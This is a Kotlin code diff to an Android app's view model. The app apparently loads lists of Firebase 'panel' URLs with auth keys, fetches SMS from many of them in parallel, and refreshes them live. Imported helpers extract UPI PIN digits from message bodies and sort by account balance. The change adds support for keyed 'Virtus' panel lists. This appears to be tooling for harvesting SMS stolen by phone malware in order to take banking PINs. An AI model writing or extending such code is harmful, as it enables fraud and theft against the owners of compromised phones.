@@ -16,7 +16,8 @@ import com.firebasepanel.sms.domain.PinFilter
 import com.firebasepanel.sms.domain.RawSms
 import com.firebasepanel.sms.domain.SortMode
 import com.firebasepanel.sms.domain.extractUpiPinDigitsFromSmsBodies
-import com.firebasepanel.sms.domain.extractFirebaseUrls
+import com.firebasepanel.sms.domain.FirebasePanel
+import com.firebasepanel.sms.domain.extractFirebasePanels
 import com.firebasepanel.sms.domain.fetchManyParallel
 import com.firebasepanel.sms.domain.mainBalanceForSort
 import com.firebasepanel.sms.domain.messageHasPinText
@@ -127,7 +128,7 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     val state: StateFlow<UiState> = _state.asStateFlow()
 
     private var lastResults: List<FetchResult> = emptyList()
-    private var storedUrls: List<String> = emptyList()
+    private var storedPanels: List<FirebasePanel> = emptyList()
     private var liveJob: Job? = null
 
     fun updateConfig(block: (FilterConfig) -> FilterConfig) {
@@ -148,12 +149,12 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     fun setAutoLiveRefresh(enabled: Boolean) {
         _state.update { it.copy(autoLiveRefresh = enabled) }
         liveJob?.cancel()
-        if (enabled && storedUrls.isNotEmpty()) {
+        if (enabled && storedPanels.isNotEmpty()) {
             liveJob =
                 viewModelScope.launch {
                     while (isActive) {
                         delay(45_000L)
-                        fetchAndCompute(storedUrls)
+                        fetchAndCompute(storedPanels)
                     }
                 }
         }
@@ -166,19 +167,25 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                     context.contentResolver.openInputStream(uri)?.use { stream ->
                         BufferedReader(InputStreamReader(stream)).readText()
                     } ?: ""
-                val urls = extractFirebaseUrls(text)
+                val panels = extractFirebasePanels(text)
+                val withoutKey = panels.count { it.authKey.isBlank() }
                 _state.update {
-                    it.copy(urlsLoaded = urls.size, progress = "${urls.size} Firebase URLs", error = null)
+                    it.copy(urlsLoaded = panels.size, progress = "${panels.size} panels (Virtus TXT)", error = null)
                 }
-                if (urls.isEmpty()) {
+                if (panels.isEmpty()) {
                     _state.update { it.copy(error = "TXT me koi Firebase URL nahi mila") }
                     return@launch
                 }
-                storedUrls = urls
+                storedPanels = panels
                 lastResults = emptyList()
                 _state.update {
                     it.copy(
-                        progress = "Ready: ${urls.size} URLs — filters set karke Start Fetch / Fetch Live",
+                        progress =
+                            buildString {
+                                append("Ready: ${panels.size} panels")
+                                if (withoutKey > 0) append(" — ⚠️ $withoutKey bina Auth Key (Virtus format: URL + KEY lines)")
+                                append(" — Start Fetch / Fetch Live")
+                            },
                         devices = emptyList(),
                         liveFeedSms = emptyList(),
                         selected = null,
@@ -196,16 +203,16 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     fun refreshNow() {
-        if (storedUrls.isEmpty()) return
-        viewModelScope.launch { fetchAndCompute(storedUrls) }
+        if (storedPanels.isEmpty()) return
+        viewModelScope.launch { fetchAndCompute(storedPanels) }
     }
 
-    private suspend fun fetchAndCompute(urls: List<String>) {
-        storedUrls = urls
+    private suspend fun fetchAndCompute(panels: List<FirebasePanel>) {
+        storedPanels = panels
         _state.update {
             it.copy(
                 fetching = true,
-                progress = "Fetching ${urls.size} Firebase URLs…",
+                progress = "Fetching ${panels.size} panels (clients + messages)…",
                 devices = emptyList(),
                 liveFeedSms = emptyList(),
                 selected = null,
@@ -213,18 +220,20 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                 error = null,
             )
         }
-        val results = fetchManyParallel(urls, concurrency = 12)
+        val results = fetchManyParallel(panels, concurrency = 6)
         lastResults = results
         val totalSms = results.sumOf { it.sms.size }
         val panelsHit = results.count { it.sms.isNotEmpty() }
+        val authHits = results.count { it.usedAuth }
         _state.update {
             it.copy(
                 fetching = false,
                 progress =
                     buildString {
-                        append("Done ${results.count { r -> r.online }} online / ${results.size} URLs")
+                        append("Done ${results.count { r -> r.online }} online / ${results.size} panels")
                         append(" · $totalSms SMS")
-                        if (panelsHit < results.size) append(" ($panelsHit panels me data)")
+                        if (authHits > 0) append(" (Virtus auth: $authHits)")
+                        if (panelsHit < results.size) append(" · data: $panelsHit panels")
                     },
                 lastFetchEpochMs = System.currentTimeMillis(),
                 lastFetchTotalSms = totalSms,
